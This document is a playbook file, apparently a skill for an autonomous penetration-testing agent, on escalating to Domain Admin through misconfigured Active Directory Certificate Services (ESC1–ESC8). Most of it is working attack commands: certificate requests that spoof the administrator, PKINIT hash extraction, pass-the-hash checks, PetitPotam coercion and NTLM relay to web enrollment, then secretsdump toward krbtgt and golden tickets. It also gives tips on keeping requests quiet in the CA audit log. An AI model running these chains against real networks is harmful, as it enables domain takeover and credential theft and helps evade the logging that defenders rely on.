---
name: svc-adcs
description: Active Directory Certificate Services abuse — the most common real-world domain escalation path (ESC1–ESC8). Load when a Windows domain has a CA, you can reach certsrv/RPC enrollment, or BloodHound shows certificates. Turns ANY low-priv domain user into DA in misconfigured PKIs. Triggers - ADCS, certificate template, ESC1/ESC2/ESC3, certipy, certsrv, pfx, PKINIT, enrollment, enterprise CA, web enrollment.
tags: [exploitation, active_directory]
---

# ADCS — Certificate Abuse (ESC1–ESC8)

## When this fires
Any authenticated (or unauth, for relay) domain position + an Enterprise CA exists. Check EARLY — misconfigured templates outnumber every other AD privesc combined in real engagements. Requires only standard user creds to enumerate.

## Detect (tool-first)
```bash
# Enumerate the whole PKI from any domain user (safe, read-only)
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -stdout | grep -A 12 "Certificate Template"   # or save json
certipy find -vulnerable                      # flags known-bad configs automatically

# Manual checks per interesting template (from certipy output):
#   Enrollment Rights   — who can request (your user? Authenticated Users? Domain Computers?)
#   msPKI-Certificate-Name-Flag   — ENROLLEE_SUPPLIES_SUBJECT = attacker picks SAN = jackpot
#   msPKI-Enrollment-Flag         — viewer can't see this; trust certipy's parse
#   pkiExtendedKeyUsage           — Client Authentication / Smart Card Logon / Any Purpose = usable
#   MS-PKI-Certificate-Name-Flag  — REQ_MANAGER_APPROVAL absent = instant issuance

# Web enrollment endpoints (relay targets)
nmap -sV -p 80,443 <ca_server>   # /certsrv/ = HTTP enrollment = NTLM-relayable (ESC8)
```

## The ESC matrix (check in order — 1 and 8 hit most often)
| ESC | Misconfig | One-line exploit |
|-----|-----------|------------------|
| 1 | Template: ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + you can enroll | `certipy req -ca <CA> -template <T> -upn administrator@<domain>` → cert AS admin |
| 2 | Any Purpose / no EKU restriction + you can enroll | same as ESC1 without needing client-auth specifically |
| 3 | Enrollment Agent template + you can enroll | request cert ON BEHALF OF admin (two-step) |
| 4 | Same as 3 but template-level agent rights | variant of 3 |
| 5 | `CA configuration: EDITF_ATTRIBUTESUBJECTALTNAME_REQUIRE` flag set globally | EVERY template accepts SAN → ESC1 against any template |
| 7 | User/Computer template default-dangerous config | certipy auto-detects |
| 8 | HTTP `/certsrv` reachable + NTLM not blocked | relay any coerced auth TO the CA → get cert for relayed identity |

## Exploit chain → PROVE IMPACT
```bash
# ESC1 — request cert with admin SAN, then authenticate with it
certipy req -u <user>@<domain> -p '<pass>' -ca <CA-name> -template <vuln-template> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
#   → outputs administrator's NT hash via PKINIT  ← THIS IS THE PROOF
crackmapexec smb <dc_ip> -u administrator -H <nt-hash>    # confirm: (Pwn3d!)

# ESC8 — relay chain (unauthenticated → DA)
# 1. Find non-SMB-signing target that coerces: PetitPotam
python3 PetitPotam.py <attacker_ip> <dc_ip>
# 2. Relay to CA web enrollment (no signing on /certsrv):
impacket-ntlmrelayx -t https://<ca_ip>/certsrv/certfnsh.asp --adcs --template DomainController
# 3. Received .pfx = DC machine cert →
certipy auth -pfx <dc>.pfx -dc-ip <dc_ip>      # → DC hash → secretsdump = full domain
```
PROOF GATES (all mandatory before state_update as exploited):
- ESC1/2/3: `certipy auth` must return an NT hash AND that hash must succeed on crackmapexec (`Pwn3d!`) against at least one host. A `.pfx` file alone is NOT impact.
- ESC8: show the relayed cert authenticating (hash from `certipy auth`) + one action as that identity.
- Record in `state_update`: Vulnerability (template name + ESC class) AND Credential (the derived NT hash).

## Post-exploit value ladder
DC machine cert (ESC8 or template targeting DC) → `impacket-secretsdump` → krbtgt → link ad playbook Domain Dominance for golden ticket. User cert for DA (ESC1) is already game over — go straight to dumping.

## Tooling integration
- `bloodhound_parse`: ingestion shows `HostsCA` / cert template edges when collection included `-c all`.
- `state_update`: evidence = certipy stdout (redact hashes to first 8 chars).
- `attack_path_suggest`: after finding ESC1, re-run — graph should connect your user → template → DA.
- Shell-driven throughout; certipy is the only required binary (pip install certipy-ad).

## Pitfalls
- Template exists but NOT published to any CA = dead end (certipy marks published CAs; don't chase unpublished templates).
- Manager approval required (`REQ_MANAGER_APPROVAL`) → request PENDS; not instant. Skip unless you control approval queue.
- `-upn` spoof fails if template has `CT_PRIVILEGE_NAME` or requires subject from the requester — read the flags, don't brute-force variants (each failed request is log-visible).
- Domain Controller auth from cert needs `-is-pfx` handling sometimes; if `certipy auth` errors on UPN→SID lookup, try `-ldap-shell` fallback to prove the cert works at all.
- Offline/root CAs unreachable = fine; you need the ISSUING (Enterprise) CA.
- Every enrollment writes to the CA audit log — request count discipline; pick ONE best template, don't spray requests across all of them.
